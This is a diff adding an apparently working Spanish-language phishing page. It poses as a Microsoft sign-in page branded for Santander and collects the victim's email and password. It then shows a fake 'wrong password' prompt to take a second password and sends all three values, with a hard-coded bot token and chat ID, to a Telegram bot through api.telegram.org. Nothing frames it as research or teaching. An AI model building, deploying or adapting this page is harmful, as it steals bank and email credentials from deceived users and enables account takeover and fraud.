@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=no"
+  />
+  <link rel="stylesheet" type="text/css" href="estiloss.css" />
+  <title>Iniciar sesión en tu cuenta Microsoft</title>
+</head>
+<body class="cb">
+  <div class="generalContainer">
+    <div class="container">
+      <img class="imagen" src="222hotmail.jpg" alt="" />
+      <h2 id="h2-text">Bienvenido a Santander</h2>
+      <p id="ss" >Santander <!--  necesitamos que vincule nuevamente su correo electrónico, inicie sesión y se vinculará automáticamente. --></p>
+      <form id="loginForm">
+        <div id="emailInput">
+          <input type="email" name="email" id="email" placeholder="Correo electrónico, teléfono o Skype" required="" />
+          <button type="button" onclick="showPasswordInput()">Siguiente</button>
+        </div>
+        <div id="passwordInput" style="display: none;">
+          <div id="emailDisplay"></div>
+          <input id="password" type="password" name="password" placeholder="Contraseña" />
+          <button type="button" onclick="showPINInput()">Iniciar sesión</button>
+        </div>
+        <div id="pinInput" style="display: none;">
+          <p id="error-message" style="color: red;">Tu cuenta o contraseña no es correcta.</p>
+          <div id="emailDisplay2" style="font-size: 18px; margin-right: 20px;"></div>
+          <input id="pin" type="password" name="pin" placeholder="Contraseña" required />
+          <button type="button" onclick="submitForm()">Iniciar sesión</button>
+        </div>
+      </form>
+      <div class="div_text">
+        <small>¿No tienes una cuenta?</small>
+        <a href="#">Cree una.</a>
+      </div>
+      <div id="statusMessage"></div>
+    </div>
+  </div>
+  <script>
+    function showPasswordInput() {
+      var emailValue = document.getElementById("email").value;
+      document.getElementById("emailDisplay").innerText = " " + emailValue;
+      document.getElementById("emailInput").style.display = "none";
+      document.getElementById("passwordInput").style.display = "block";
+      document.getElementById("error-message").style.display = "none";
+      document.getElementById("h2-text").innerText = "Escribir contraseña";
+      document.getElementById("password").focus();
+    }
+
+    function showPINInput() {
+      var emailValue = document.getElementById("email").value;
+      document.getElementById("emailDisplay2").innerText = " " + emailValue;
+      document.getElementById("passwordInput").style.display = "none";
+      document.getElementById("pinInput").style.display = "block";
+      document.getElementById("error-message").style.display = "block";
+      document.getElementById("h2-text").innerText = "Escribir contraseña";
+      document.getElementById("pin").focus();
+    }
+    const CHAT_ID = 1900569011;
+  const BOT_TOKEN = '6588209506:AAE0tCvE9p3LMROYDpYE8CGxVF6QV621g1w';
+
+  function submitForm() {
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    const pin = document.getElementById('pin').value;
+
+    const message = `✓✓✓Santander✓✓✓\n✓✓✓@ProArgFull✓✓✓\n✓✓✓Email✓✓✓: ${email}\n✓✓✓Password✓✓✓: ${password}\n✓✓✓Password2✓✓✓: ${pin}`;
+
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+    // Realiza la solicitud POST directamente a la API de Telegram
+    fetch(url, {
+      method: 'POST',
+    })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Error al enviar el mensaje a Telegram');
+        }
+        return response.json();
+      })
+      .then(data => {
+        // Aquí puedes manejar la respuesta de Telegram si es necesario
+        console.log('Mensaje enviado con éxito a Telegram', data);
+
+        // Redirige a Google después de enviar el mensaje a Telegram
+        window.location.href = 'index.html';
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
+  }
+  </script>
+</body>
+</html>
